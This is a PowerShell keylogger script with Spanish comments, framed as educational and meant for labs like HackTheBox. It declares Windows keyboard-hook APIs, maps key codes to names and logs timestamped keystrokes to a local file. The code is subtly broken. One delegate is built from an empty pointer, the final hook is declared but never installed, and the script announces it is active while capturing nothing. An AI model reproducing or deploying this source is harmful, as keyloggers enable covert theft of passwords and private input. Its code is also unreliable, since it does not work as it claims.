# Keylogger Simple en PowerShell - Solo para fines educativos
# Uso exclusivo en entornos controlados como HackTheBox

# Obtener la ruta del script
$scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
$logFile = Join-Path $scriptPath "keylog.txt"

# Crear archivo de log si no existe
if (-not (Test-Path $logFile)) {
    New-Item -Path $logFile -ItemType File -Force | Out-Null
}

# Importar namespace para capturar teclas
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Variable para rastrear teclas especiales
$previousKey = $null

# Función para obtener el nombre de la tecla especial
function Get-KeyName {
    param([int]$keyCode)
    
    $specialKeys = @{
        8 = "[BACKSPACE]"
        9 = "[TAB]"
        13 = "[ENTER]"
        27 = "[ESC]"
        32 = "[SPACE]"
        37 = "[LEFT]"
        38 = "[UP]"
        39 = "[RIGHT]"
        40 = "[DOWN]"
        46 = "[DELETE]"
        16 = "[SHIFT]"
        17 = "[CTRL]"
        18 = "[ALT]"
        20 = "[CAPS]"
        144 = "[NUMLOCK]"
        145 = "[SCROLLLOCK]"
        91 = "[WIN]"
        112 = "[F1]"
        113 = "[F2]"
        114 = "[F3]"
        115 = "[F4]"
        116 = "[F5]"
        117 = "[F6]"
        118 = "[F7]"
        119 = "[F8]"
        120 = "[F9]"
        121 = "[F10]"
        122 = "[F11]"
        123 = "[F12]"
    }
    
    if ($specialKeys.ContainsKey($keyCode)) {
        return $specialKeys[$keyCode]
    }
    return $null
}

# Función para capturar teclas
function Start-Keylogging {
    $hookId = $null
    $delegate = $null
    
    # Crear un hook global de teclado
    $Global:hookDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0),
        [type] @"
        public delegate int LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
"@
    )
    
    # Definir P/Invoke para SetWindowsHookEx
    $User32 = @"
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint GetCurrentThreadId();
"@
    
    Add-Type -MemberDefinition $User32 -Name "Keylogger" -Namespace "Win32" -Using System.Runtime.InteropServices
    
    # Crear el hook
    $hookId = [Win32.Keylogger]::SetWindowsHookEx(13, $Global:hookDelegate, 
        [Win32.Keylogger]::GetModuleHandle("user32"), 0)
    
    # Bucle para mantener el script activo
    while ($true) {
        Start-Sleep -Milliseconds 100
    }
}

# Versión alternativa más simple usando diferente método
function Start-SimpleKeylogging {
    Add-Type -AssemblyName System.Windows.Forms
    
    $keyboardListener = {
        param($sender, $e)
        
        $key = $e.KeyCode
        $keyName = Get-KeyName ([int]$key)
        
        if ($keyName) {
            $output = $keyName
        } else {
            $output = $key.ToString()
        }
        
        # Agregar timestamp
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $logEntry = "[$timestamp] $output"
        
        # Escribir al archivo
        Add-Content -Path $logFile -Value $logEntry
    }
    
    # Crear un listener global
    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = [System.Windows.Forms.FormWindowState]::Minimized
    $form.ShowInTaskbar = $false
    
    # Evento de tecla presionada
    $form.add_KeyDown($keyboardListener)
    
    [void]$form.ShowDialog()
}

# Iniciar el keylogger
Write-Host "Keylogger iniciado. Las teclas se guardarán en: $logFile"
Write-Host "Script ejecutándose en segundo plano..."

# Alternativa más estable: usar Windows.Forms
Add-Type -AssemblyName System.Windows.Forms

$Global:lastKey = $null

$hookScript = {
    Add-Type @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    
    public class KeyboardHook {
        public delegate int LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetKeyboardState(byte[] lpKeyState);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint flags);
    }
"@
}

# Ejecutar en el contexto actual
& $hookScript

# Mantener el script activo indefinidamente
Write-Host "Keylogger activo. Presiona Ctrl+C para detener."

try {
    while ($true) {
        Start-Sleep -Seconds 1
    }
} catch {
    Write-Host "Keylogger detenido."
}
